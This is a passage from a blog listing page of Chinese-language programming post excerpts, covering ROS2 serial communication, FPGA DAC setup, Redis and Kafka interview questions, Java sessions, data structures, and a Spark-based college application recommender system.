	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇 (139条消息) ROS2将键盘方向键控制指令通过串口发送_识龟成鳖的博客-CSDN博客，实现了电脑键盘4个方向键读取，并通过话题发送出来，另一个节点接收话题并通过串口发送。当时用虚拟串口工具socat测试都没问题，但接到usb串口实物后发现发送出来的数据有问题，安装cutecom测试硬件驱动都没有问题，定位问题在发送程序，但很久都没解决。限于目前的能力，只能另外再找库。初步想法：电脑读取4个方向键节点不变，另建一个python功能包，接收方向键话题，再用python3-serial库将控制数据发送到串口。
参考博客：
(139条消息) ROS2实现虚拟串口通信_ros与主机通过虚拟串口通信_ff925的博客-CSDN博客
(139条消息) 使用python serial 库发送16进制数据_python serial以16进制发送_New农民工的博客-CSDN博客
以及古月居的python话题例程
《ROS2入门21讲图文教程 | 10、话题》 - 古月居 (guyuehome.com)
一、安装python3-serial库
sudo apt-get install python3-serial
二、新建python功能包
~/dev_A1/src$ ros2 pkg create --build-type ament_python header_python
进入~/dev_A1/src/header_python/header_python$文件夹
gedit header_python_subscriber.py
将以下代码复制到新建文件
#!/usr/bin/env python3 # -*- coding: utf-8 -*- import time import serial import rclpy # ROS2 Python接口库 from rclpy.node import Node # ROS2 节点类 from std_msgs.msg import String # ROS2标准定义的String消息 serial_port = serial.Serial( port="/dev/ttyUSB0", baudrate=115200, bytesize=serial.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9aa4008d0482b40ed390fcca31d66a29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec95b87fa9c45b30022fd40ef0ad455d/" rel="bookmark">
			Vivado 下 AD9767 双通道正弦波产生例程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Vivado 下 AD9767 双通道正弦波产生例程
1、实验简介
2、实验原理
2.1、AN9767 模块原理框图
2.2、AD9767 芯片简介
2.3、电流电压转换及放大
3、程序设计
3.1、生成 ROM 初始化文件
3.2、双通道正弦波发生程序
3.3、通过一个 PLL IP 来产生 125M 的 DA 输出时钟
3.4、将 .coe 文件保存到生成的 Rom IP 核中
3.5、添加约束文件.XDC
4、实验现象
Vivado 下 AD9767 双通道正弦波产生例程 1、实验简介 本实验基于 Xinlinx 黑金 AX7A035 FPGA 开发板， 练习使用 AN9767 模块，实验中使用的模块是采用 ANALOG DEVICES 公司的 AD9767 芯 片，支持独立双通道、14 位、 125MSPS 的数模转换。在教程中介绍了利用该模块与 FPGA 开发板相连输出双通道 14 位的正弦波，然后通过示波器查看把输出的正弦波的波形。 AN9767 模块实物照片如下： AN9767 双通道 DA 模块的详细参数: DA 转换芯片：AD9767； 通道数：2 通道； DA 转换位数：14bit； DA 更新速率：125 MSPS； 输出电压范围：-5V~+5V； 模块 PCB 层数：4 层，独立的电源层和 GND 层； 模块接口：40 针 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec95b87fa9c45b30022fd40ef0ad455d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f96231b83fff0f4ecab21b53de5748fa/" rel="bookmark">
			Redis面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis 是什么 面试官：你先来说下 Redis 是什么吧！
我：（这不就是总结下 Redis 的定义和特点嘛）Redis 是 C 语言开发的一个开源的（遵从 BSD 协议）高性能键值对（key-value）的内存数据库，可以用作数据库、缓存、消息中间件等。
它是一种 NoSQL（not-only sql，泛指非关系型数据库）的数据库。
我顿了一下，接着说，Redis 作为一个内存数据库：
性能优秀，数据在内存中，读写速度非常快，支持并发 10W QPS。单进程单线程，是线程安全的，采用 IO 多路复用机制。丰富的数据类型，支持字符串（strings）、散列（hashes）、列表（lists）、集合（sets）、有序集合（sorted sets）等。支持数据持久化。可以将内存中数据保存在磁盘中，重启时加载。主从复制，哨兵，高可用。可以用作分布式锁。可以作为消息中间件使用，支持发布订阅。
五种数据类型 面试官：总结的不错，看来是早有准备啊。刚来听你提到 Redis 支持五种数据类型，那你能简单说下这五种数据类型吗？
我：当然可以，但是在说之前，我觉得有必要先来了解下 Redis 内部内存管理是如何描述这 5 种数据类型的。
说着，我拿着笔给面试官画了一张图：
我：首先 Redis 内部使用一个 redisObject 对象来表示所有的 key 和 value。
redisObject 最主要的信息如上图所示：type 表示一个 value 对象具体是何种数据类型，encoding 是不同数据类型在 Redis 内部的存储方式。
比如：type=string 表示 value 存储的是一个普通字符串，那么 encoding 可以是 raw 或者 int。
我顿了一下，接着说，下面我简单说下 5 种数据类型：
①String 是 Redis 最基本的类型，可以理解成与 Memcached一模一样的类型，一个 Key 对应一个 Value。Value 不仅是 String，也可以是数字。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f96231b83fff0f4ecab21b53de5748fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb1c33b35acc2201577d5abe555e8363/" rel="bookmark">
			Session浅谈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 概念：服务器端会话技术，在一次会话的多次请求间共享数据，将数据保存在服务器端的对象中。
快速入门：
获取HttpSession对象：
HttpSession session = request.getSession();使用HttpSession对象：
Object getAttribute(String name)
void setAttribute(String name, Object value)
void removeAttribute(String name) 原理
Session的实现是依赖于Cookie的。 细节：
当客户端关闭后，服务器不关闭，两次获取session是否为同一个？
默认情况下。不是。如果需要相同，则可以创建Cookie,键为JSESSIONID，设置最大存活时间，让cookie持久
化保存。
Cookie c = new Cookie(“JSESSIONID”,session.getId());
c.setMaxAge(60*60);
response.addCookie©; 客户端不关闭，服务器关闭后，两次获取的session是同一个吗？
不是同一个，但是要确保数据不丢失。tomcat自动完成以下工作 session的钝化： 在服务器正常关闭之前，将session对象系列化到硬盘上 session的活化： 在服务器启动后，将session文件转化为内存中的session对象即可。 session什么时候被销毁？
1、点击控制台的红色按钮异常关闭服务器要销毁session
2. session对象调用invalidate() 。
3. session默认失效时间 30分钟
选择性配置修改 30
session的特点
session用于存储一次会话的多次请求的数据，存在服务器端session可以存储任意类型，任意大小的数据 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88b5eddc55bae11bf36f6423c22796e9/" rel="bookmark">
			“Kafka”面试题 （建议收藏）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“Kafka”面试题 （建议收藏） - 哔哩哔哩
1. Apache Kafka是什么？ Apach Kafka是一款分布式流处理平台，用于实时构建流处理应用。它有一个核心的功能广为人知，即作为企业级的消息引擎被广泛使用（通常也会称之为消息总线message bus）。
2. Kafka 的设计是什么样的？ Kafka 将消息以 topic 为单位进行归纳
将向 Kafka topic 发布消息的程序成为 producers.
将预订 topics 并消费消息的程序成为 consumer.
Kafka 以集群的方式运行，可以由一个或多个服务组成，每个服务叫做一个 broker.
producers 通过网络将消息发送到 Kafka 集群，集群向消费者提供消息
3. Kafka 如何保证高可用？ 的基本架构组成是：由多个 组成一个集群，每个 是一个节点；当创建一个 时，这个 会被划分为多个 ，每个 可以存在于不同的 上，每个 只存放一部分数据。
这就是天然的分布式消息队列，就是说一个 的数据，是分散放在多个机器上的，每个机器就放一部分数据。
在 版本之前，是没有 机制的，当任何一个 所在节点宕机了，这个 上的 就无法提供读写服务，所以这个版本之前， 没有什么高可用性可言。
在 以后，提供了 机制，就是 副本机制。每个 上的数据都会同步到其它机器，形成自己的多个 副本。所有 会选举一个 出来，消息的生产者和消费者都跟这个 打交道，其他 作为 。写的时候， 会负责把数据同步到所有 上去，读的时候就直接读 上的数据即可。 负责均匀的将一个 的所有 分布在不同的机器上，这样才可以提高容错性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88b5eddc55bae11bf36f6423c22796e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/812d763fb414795098cf3cfaf6841e20/" rel="bookmark">
			vivado：引脚已约束但是报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题引入 报错信息如下：
[DRC UCIO-1] Unconstrained Logical Port: 3 out of 3 logical ports have no user assigned specific location constraint (LOC). This may cause I/O contention or incompatibility with the board power or connectivity affecting performance, signal integrity or in extreme cases cause damage to the device or the components to which it is connected. To correct this violation, specify all pin locations. This design will fail to generate a bitstream unless all logical ports have a user specified site LOC constraint defined.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/812d763fb414795098cf3cfaf6841e20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aba236d1dbaaec9eed6dd208bbd239cd/" rel="bookmark">
			高校学籍管理系统（SQL Server数据库课程设计）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 该文章已同步收录到我的博客网站，欢迎浏览我的博客网站，[xhang's blog](https://xhablog.online/) 1.概述1.1数据库设计选题背景1.2功能要求1.3系统功能解决的问题 2.需求分析3.概念结构设计3.1抽象出系统的实体3.2设计实体属性图3.3全局E-R图 4.逻辑结构设计5.数据库物理设计与实施5.1数据库关系图5.2表的创建 6.数据操作要求及实现6.1数据查询6.2视图6.3触发器6.4存储过程 该文章已同步收录到我的博客网站，欢迎浏览我的博客网站，xhang’s blog 说明：本博客为本人期末课程设计，可供学习、借鉴和参考，不可转载。文章最后有百度网盘链接。
1.概述 1.1数据库设计选题背景 随着信息化时代的到来，人们的生活发生了巨大的变化，信息化时代带给了人们更多的处理数据的方式。学生学籍管理是一个非常繁琐且复杂的工作，其中的原因就是涉及到大量的学生学籍数据信息，这样庞大的一个数据群管理起来就想当麻烦，在传统的数据信息管理模式下，工作效率不仅低下，而且数据在存储、更新、删改等操作上会出现错误。基于以上出现的问题，开发一个学籍管理系统就显得很重要。
1.2功能要求 一：实现学生信息、班级、院系、专业等的管理；
二：实现课程、学生成绩信息管理；
三：实现学生的奖惩信息管理；
四：建立数据库相关表之间的参照完整性约束。
五：创建规则用于限制性别项只能输入“男”或“女”；
六：创建视图查询各个学生的学号、姓名、班级、专业、院系；
七：创建触发器当增加、删除学生和修改学生班级信息时自动修改相应班级学生人数；
八：创建存储过程查询指定学生的成绩单；
1.3系统功能解决的问题 一：提高管理人员的工作效率。
二：对大量的数据信息进行统筹规划
三：降低处理数据信息时出现的错误率。
四：方便系统的后期维护。
2.需求分析 该高校学籍管理系统主要是实现对大学在校生的学籍信息的系统化管理，具体的功能涉及实现对学生的基本信息、班级、专业、院系等的查询、修改和删除等功能，同时也会实现课程、学生成绩信息管理、实现学生的奖惩信息管理。
同时该高校学籍管理系统要创建学生信息视图，具体实现如下：
一：创建学生基本信息视图，实现查询各个学生的学号、姓名、班级、专业、院系。
二：创建学生成绩视图，实现查询各个学生的学号、姓名、课程、成绩。
三：创建学生奖惩视图，实现查询各个学生的学号、姓名、班级、专业、院系、奖惩号、奖惩名、奖惩方案。
该高校学籍管理系统要创建触发器当增加、删除学生和修改学生班级信息时自动修改相应班级学生人数。
最后，该高校学籍管理系统要创建存储过程查询指定学生的成绩单
该学籍管理系统会对学生信息进行系统化管理，在数据和数据之间实现关联性，较大程度的满足用户需求。
3.概念结构设计 3.1抽象出系统的实体 根据设计学生管理系统的需要，可以抽象出以下实体：
（1）学生信息
（2）班级信息
（3）专业信息
（4）院系信息
（5）课程信息
（6）课程成绩信息
（7）奖惩信息
3.2设计实体属性图 (1).学生实体属性图
(2).班级实体属性图
(3).专业实体属性图
(4).院系实体属性图
(5).课程实体属性图
(6).课程成绩实体属性图
(7).奖惩实体属性图
3.3全局E-R图 4.逻辑结构设计 关系数据模式
（1）学生（学号，姓名，性别，班级编号，专业编号，院系编号，民族，年龄，出生日期，家庭地址，入学时间）
（2）班级（班级编号，专业编号，院系编号，班级名称，人数）
（3）专业（专业编号，院系编号，专业名称）
（4）院系（院系编号,院系名称）
（5）课程（课程号，课程名，学分，学时）
（6）课程成绩（课程号，学号，成绩）
（7）奖惩（奖惩号，学号，专业编号，院系编号，奖惩名称，奖惩方案）
5.数据库物理设计与实施 5.1数据库关系图 根据概念结构设计和逻辑结构的内容，可以将此学籍管理系统设计出7个表，分别为“Student表”、“Class表”、“Major表”、“Department表”、“Course表”、“Grader表”和“Award_punish表”。具体如下：
这7张表的数据库关系图如下：
5.2表的创建 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aba236d1dbaaec9eed6dd208bbd239cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/678caec3a1885bbf013de55344c2220e/" rel="bookmark">
			Python 中的迭代器和生成器深度理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、介绍 迭代器（Iterators）和生成器（Generators）是 Python 中最强大的功能之一，但也是新手最容易混淆的部分。本文将深入探讨这两种概念，以及它们在 Python 编程中的实际应用。
二、理解迭代器 首先，我们来理解什么是迭代器。在 Python 中，迭代器是任何实现了迭代器协议（定义了 __iter__() 和 __next__() 方法）的对象。我们可以通过调用 next() 方法获取迭代器的下一个值。当迭代器耗尽时，将引发 StopIteration 异常。
下面是一个简单的迭代器例子：
class Counter: def __init__(self, low, high): self.current = low self.high = high def __iter__(self): return self def __next__(self): if self.current &lt; self.high: num = self.current self.current += 1 return num raise StopIteration for num in Counter(3, 9): print(num) 这个 Counter 类定义了一个简单的迭代器，它从 low 开始，每次迭代增加 1，直到达到 high。注意我们是如何在 __next__ 方法中抛出 StopIteration 的。这是因为 for 循环通过捕获 StopIteration 异常来知道何时停止迭代的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/678caec3a1885bbf013de55344c2220e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a70e766c70ee0fb7ec9d79680b52cd5/" rel="bookmark">
			截取字符串 C语言实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 截取字符串 描述
输入一个字符串和一个整数 k ，截取字符串的前k个字符并输出
数据范围：字符串长度满足 1≤ n ≤1000 ， 1≤ k ≤n
输入描述：
1.输入待截取的字符串
2.输入一个正整数k，代表截取的长度
输出描述：
截取后的字符串
示例1
输入：
abABCcDEF
6
输出：
abABCc
示例2
输入：
bdxPKBhih
6
输出：
bdxPKB
代码
#include &lt;stdio.h&gt; int main() { char str[1000]; int k; while(~scanf("%s",str)) { scanf("%d",&amp;k); for(int i=0;i&lt;k;i++) { printf("%c",str[i]); } } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3783fa1bc6b01a9b918d49059d7b156/" rel="bookmark">
			BFS 广度优先搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		广度优先搜索BFS（Breadth First Search）也称为宽度优先搜索，它是一种先生成的结点先扩展的策略，类似于树的层次遍历。
在广度优先搜索算法中，解答树上结点的扩展是按它们在树中的层次进行的。首先生成第一层结点，同时检查目标结点是否在所生成的结点中，如果不在，则将所有的第一层结点逐一扩展，得到第二层结点，并检查第二层结点是否包含目标结点，……，对层次为n+1的任一结点进行扩展之前，必须先考虑层次完层次为n的结点的每种可能的状态。因此，对于同一层结点来说，求解问题的价值是相同的，可以按任意顺序来扩展它们。通常采用的原则是先生成的结点先扩展。
为了便于进行搜索，要设置一个表存储所有的结点。由于在广度优先搜索算法中，要满足先生成的结点先扩展的原则，所以存储结点的表一般采用队列这种数据结构。
在编写程序时，可用数组q模拟队列。
front和rear分别表示队头指针和队尾指针，初始时front=rear=0。 元素x入队操作为 q[rear++]=x; 元素x出队操作为 x =q[front++]; 广度优先搜索算法的搜索步骤一般是：
（1）从队列头取出一个结点，检查它按照扩展规则是否能够扩展，如果能则产生一个新结点。
（2）检查新生成的结点，看它是否已在队列中存在，如果新结点已经在队列中出现过，就放弃这个结点，然后回到第（1）步。否则，如果新结点未曾在队列中出现过，则将它加入到队列尾。
（3）检查新结点是否目标结点。如果新结点是目标结点，则搜索成功，程序结束；若新结点不是目标结点，则回到第（1）步，再从队列头取出结点进行扩展。
最终可能产生两种结果：找到目标结点，或扩展完所有结点而没有找到目标结点。
如果目标结点存在于解答树的有限层上，广度优先搜索算法一定能保证找到一条通向它的最佳路径，因此广度优先搜索算法特别适用于只需求出最优解的问题。当问题需要给出解的路径，则要保存每个结点的来源，也就是它是从哪一个节点扩展来的。
对于广度优先搜索算法来说，问题不同则状态结点的结构和结点扩展规则是不同的，但搜索的策略是相同的。广度优先搜索算法的框架一般如下：
void BFS（） { 队列初始化； 初始结点入队； while （队列非空） { 队头元素出队，赋给current； while （current 还可以扩展） { 由结点current扩展出新结点new； if （new 重复于已有的结点状态） continue; new结点入队； if (new结点是目标状态) { 置flag= true; break; } } } } 对于不同的问题，用广度优先搜索法的算法基本上都是一样的。但表示问题状态的结点数据结构、新结点是否为目标结点和是否为重复结点的判断等方面则有所不同。对具体的问题需要进行具体分析，这些函数要根据具体问题进行编写。
接下来从一个经典的迷宫问题引入：哔哩哔哩完整视频讲解
关于搜索方向：
测试用例：
5 4 1 1 2 1 1 1 1 1 1 1 2 1 1 2 1 1 1 1 1 2 1 1 4 3 输出：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3783fa1bc6b01a9b918d49059d7b156/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfaf88e88f2b0ffccc29063741eb792c/" rel="bookmark">
			Java中的逻辑控制语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、控制语句 1、if语句 格式1：
if(布尔表达式）{
//语句
}
示例：
如果布尔表达式为真，则执行{}中的语句，否则不执行。
格式2：
if(布尔表达式）{
//语句1
}else{
//语句2
}
示例：
格式3：
if(布尔表达式1){
//语句1
}else if(布尔表达式2){
//语句2
}else{
//语句3}
示例：
注意： （1）代码风格：
虽然两种写法都是合法的，但是Java中更推荐使用风格1，{和if / else 放在同一行，代码更紧凑。
（2）if语句后面不需要分号
由于if后面有个分号，所以它和后面的打印语句毫不相干了，不论i是否等于10，都会打印12345。
（3）if/else语句不加大括号，后面也可以写一个语句，此时else会和离它最近的if匹配，可能会造成一些不必要的麻烦。所以建议大家不要这样写，要养成良好的变成习惯。
2、switch语句 示例：
执行流程：
（1）先计算switch后面的()中表达式的值
（2）根据表达式的值和case依次比较，遇到匹配的case，则执行case下面的语句，直到遇到break才会结束
（3）如果表达式的值和所有的case都不匹配，则执行default下面的语句
注意：
（1）多个case后的值不可以重复
（2） switch后面的()内只能是以下类型的表达式：
基本类型：byte、char、short、int
引用类型：String常量字符串、枚举类型
（3）每个case语句后面最好都跟一个break，否则会带来不必要的麻烦。
（4）switch不能执行复杂的判断条件 。
（5）switch语句可以嵌套使用，但是不推荐，因为这样写出来的代码不美观。
二、循环语句 1、while循环 while（循环条件）{
循环语句；
}
循环条件如果为真，则执行循环语句，否则跳出循环。
示例：打印5~1的数字
注意： （1）while语句也可以不写{}，但是不写{}的时候只能写一条语句，建议加上{}
（2）建议while后面的{和while写在同一行，养成良好的编程习惯
（3）while语句后面也不需要分号，否则代码可能出现意料之外的错误
（4）合理使用break和continue功能
break的功能是让循环提前结束： 当a=2时，就会执行if语句中的break，结束循环，所以只打印了5、4、3
continue的功能是跳过本次循环，执行下一次循环。
当a=2时，执行if语句，continue 后面的代码不会被执行，直接进行下一次循环。
2、for循环 for（表达式1；布尔表达式2；表达式3）
{
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfaf88e88f2b0ffccc29063741eb792c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43924b78fdf618d1b2f136b0dbdde375/" rel="bookmark">
			数据结构 线性表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线性表的基本概念 线性表是一种经常在计算机科学和数据结构中使用的基本数据结构。它是由一组按照顺序排列的元素组成的数据结构，这些元素之间存在一对一的前后关系。
线性表中的元素可以是任意类型的数据，例如整数、字符、对象等。每个元素都有一个唯一的位置，称为索引，用于标识该元素在线性表中的位置。
线性表具有以下几个基本概念：
元素：线性表中的每个数据项称为元素。元素可以是任意类型的数据，如整数、字符、对象等。
索引：每个元素在线性表中都有一个唯一的位置标识，称为索引。索引通常从0开始，依次递增，用于访问和定位元素。
大小：线性表的大小是指线性表中元素的个数。大小可以动态地增加或减少，取决于对线性表的操作。
插入：向线性表中插入一个元素，将该元素添加到线性表的某个位置上，使得其他元素后移，保持顺序不变。
删除：从线性表中删除一个元素，将该元素从线性表中移除，并将后面的元素前移，保持顺序不变。
查找：在线性表中根据给定条件查找元素。常见的查找方式有按索引查找和按值查找。
线性表可以使用不同的数据结构来实现，如数组和链表。其中，数组实现的线性表具有随机访问的优势，可以通过索引直接访问元素，而链表实现的线性表具有动态插入和删除的优势。
常见实现方式 顺序存储和链式存储 线性表可以通过两种常见的方式进行实现：顺序存储和链式存储。
顺序存储：
顺序存储使用一块连续的内存空间来存储线性表的元素。在顺序存储中，使用数组来表示线性表，每个元素占据数组中的一个位置，通过索引可以直接访问元素。 顺序存储的特点：
随机访问：可以通过索引直接访问元素，具有常数时间复杂度 O(1)。内存连续性：线性表中的元素在内存中是连续存储的，因此可以充分利用缓存性能。大小固定：数组的大小在创建时就确定了，无法动态改变，除非重新创建一个更大的数组并复制数据。 链式存储：
链式存储使用节点之间的指针关系来表示线性表。每个节点包含一个数据元素和一个指向下一个节点的指针。 链式存储的特点：
动态插入和删除：可以动态地插入和删除节点，不需要移动其他元素，只需修改指针的指向，具有较低的时间复杂度。内存分散：线性表的元素在内存中可以是分散存储的，每个节点可以位于任意位置，因此不受固定大小的限制。需要额外的空间：除了存储元素本身外，每个节点还需要额外的指针空间来指向下一个节点，增加了存储开销。 链式存储可以使用不同的链表类型来实现，如单链表、双向链表和循环链表等。每种链表类型有不同的节点结构和指针关系，但都遵循链式存储的基本原理。
选择顺序存储还是链式存储取决于具体的应用场景和需求。顺序存储适用于对元素的随机访问较多的情况，而链式存储适用于需要频繁插入和删除元素的情况。
线性表的应用 线性表是一种基础的数据结构，广泛应用于计算机科学和软件开发中的各个领域。下面列举一些线性表的应用场景：
数组：数组是一种顺序存储的线性表，常用于需要随机访问元素的场景。例如，存储一组学生成绩、处理图像像素、实现哈希表等。
链表：链表是一种链式存储的线性表，适用于频繁插入和删除元素的场景。例如，实现栈和队列、处理大量数据的流式处理、构建高级数据结构如二叉树和图等。
栈：栈是一种后进先出（LIFO）的线性表，常用于函数调用、表达式求值、内存管理等场景。例如，实现函数调用栈、实现逆波兰表达式求值、解决迷宫问题等。
队列：队列是一种先进先出（FIFO）的线性表，常用于任务调度、消息传递、缓冲区管理等场景。例如，实现消息队列、模拟排队系统、实现广度优先搜索等。
链表：链表是一种链式存储的线性表，适用于频繁插入和删除元素的场景。例如，实现栈和队列、处理大量数据的流式处理、构建高级数据结构如二叉树和图等。
哈希表：哈希表是一种基于数组的线性表，通过哈希函数将关键字映射到数组的索引位置，用于高效地查找、插入和删除元素。例如，实现字典、实现数据库索引、解决碰撞冲突等。
线性表的组合应用：线性表可以与其他数据结构相结合，构建更复杂的数据结构和算法。例如，通过链表实现图的邻接表表示、通过数组和链表实现树的遍历、通过栈和队列实现排序算法等。
这些只是线性表在各个领域中的一些应用示例，实际上线性表作为一种基础数据结构，几乎在所有计算机科学和软件开发的领域中都有广泛的应用。
操作实现 以下是线性表的基本操作的 C 语言示例代码： ```c #include &lt;stdio.h&gt; #define MAX_SIZE 100 // 定义线性表结构 typedef struct { int data[MAX_SIZE]; // 存储元素的数组 int length; // 线性表的当前长度 } LinearList; // 初始化线性表 void initList(LinearList *list) { list-&gt;length = 0; } // 获取线性表的长度 int getLength(LinearList list) { return list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43924b78fdf618d1b2f136b0dbdde375/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3c5d1c8cd13cb9c8a255dbb07fcd60b/" rel="bookmark">
			vba数组例子
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Sub Example() Dim arr(1 To 3, 1 To 2) As Integer '创建一个3行2列的二维数组 arr(1, 1) = 1 '赋值 arr(1, 2) = 2 arr(2, 1) = 3 arr(2, 2) = 4 arr(3, 1) = 5 arr(3, 2) = 6 For i = 1 To 3 '循环取值 For j = 1 To 2 Debug.Print arr(i, j) Next j Next i End Sub 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b980eeed73234b96e47d77a17e0c70da/" rel="bookmark">
			关于windows10上的sourcetree突然打不开的问题的解决策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天打开自己win10上的sourcetree，发现只是图标闪了一下，但是并没有打开，反复尝试重新打开几次后依然没有成功，最后试了试万能重启电脑大法，重启后也还是没有成功打开。然后开始上网找策略，我这个策略不全，只说两种我尝试过的：
策略1 —— 添加配置信息 在自己的
C:\Users\你的用户名\AppData\Local\Atlassian\SourceTree.exe_Url_nf12znmaeznytulsuzeaz22lpprrbpo3\版本号 文件夹下有一个user.config 配置文件中加入如下配置：
&lt;setting name="AutomaticallyCleanUpDictionaryFiles" serializeAs="String"&gt; &lt;value&gt;True&lt;/value&gt; &lt;/setting&gt; 我也不清楚为什么这么搞，看大佬们这么操作的，但是我用这个方法没奏效。
策略2 —— 删除一个缓存文件 然后就看到他们说去看一下sourcetree的日志，日志在这里：
C:\Users\你的用户名\AppData\Local\Atlassian\SourceTree 下的名为 sourcetree.log 的文件，打开后发现了如下报错：
好像是与什么VisualStudio组件什么有关的，还报什么
Unable to load MEF components System.InvalidOperationException: 序列不包含任何元素 的错误，乱七八糟的我也搞不清楚，但是我搜了一下搜到个这样的帖子，链接如下：
解决办法
上面的链接有一个评价说他/她把在
C:\Users\你的用户名\AppData\Local\Atlassian\SourceTree.exe_Url_nf12znmaeznytulsuzeaz22lpprrbpo3\版本号 这个文件夹下的 Composition.cache 文件删除了，然后就能成功打开sourcetree了，我用这个方法成功了，而且打开sourcetree后成功生成了我们删除的 Composition.cache 文件。不过我很纳闷为什么会发生这种情况，欢迎有知道的大佬前来指教一二。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/911a04ccd0f21ead8ef942efb406b5b3/" rel="bookmark">
			基于Spark的高考志愿推荐系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘要
本文介绍了基于Spark的高考志愿推荐系统的设计与实现的开发过程，包括开发环境介绍，系统设计框架以及数据库详细设计。该系统将结合各省份历年的考试数据和各大高校历年的招生数据，根据考生提供的成绩和学校给出基于考生成绩的学校推荐。本文该系统中，使用爬虫对中国教育在线网站上各高校的高考录取数据进行爬取。使用kettle对其进行数据预处理。利用mysql数据库进行数据存储。使用python进行前端界面搭建。最后根据考生输入的相关信息进行志愿推荐。本系统意在为考高学子在填报志愿时提供一些参考,增加考生被符合其考试成绩的院校录取的概率。
关键词：Spark 高考志愿推荐 Mysql python
1.2研究意义 随着科教兴国战略和人才强国战略的逐步实施，我国高等教育取得了超常规的跨越式发展，其中具有历史意义的变化就是高等教育规模的迅速扩大。　全国高考报名人数在2020年已经突破了1000万大关，也就是说，每年将会有超过1000万的高考考生进行高考。谈到高考，就不得不说高考志愿填报这件事情，无论是上本科还是上专科，志愿填报是必须走的一个重要流程。高考志愿填报和高考都是人生中最重要的一步。如果说高考是为了获取高等学府的敲门砖，那么志愿填报将会影响到考生未来的前途。填报志愿科学、合理，就能够提高被和考生考试成绩相符合的高校录取的概率；如果志愿选择不当，找不准与考生考分相对应的高校，即使考出了不错的成绩，也可能与重点大学擦肩而过，或者高分低就，甚至会出现落榜的情况，被迫走征集志愿，留下终的遗憾。所以有人说，高考成功与否，70%靠实力，30%看志愿。所以我们针对　这个现状，利用大数据的手段，对高考志愿填报进行研究，预测各高校录取线所在区间，为高考志愿填报提供建议。与传统在书本上获取高校招生信息相比，在线系统有着很多优点：
检索便捷，考生可以通过多种检索途径进行检索，比如录取批次，文理类别，院校地区等途径进行快速且精准的检索。　信息量大，在线系统能够提供海量的高校信息，相比高考志愿录用信息相关的书本而言，在线系统的信息能够更全面。　使用方便，在线系统后端使用数据库对数据进行存储，相比于厚厚的一本高考志愿利用信息相关的书籍，使用在线系统搜寻信息更加便捷。 1.3研究内容 编写的这个基于Spark的高考志愿推荐系统是用的是爬虫技术，基于Spark的高考志愿推荐系统我编写的一些功能是下面这些：
用户端
1、注册登录，上传个人信息
2、交流论坛块
3、高考资讯模块
4、在线留言模块
5、个人中心模块
6、高考志愿模块
管理员
1、注册登录，上传个人信息
2、高考志愿模块
3、用户管理模块
4、志愿填报模块
5、个人中心模块
6、专业管理模块
4.1.2系统功能结构图 图4-2 功能结构图
5.1系统登录模块
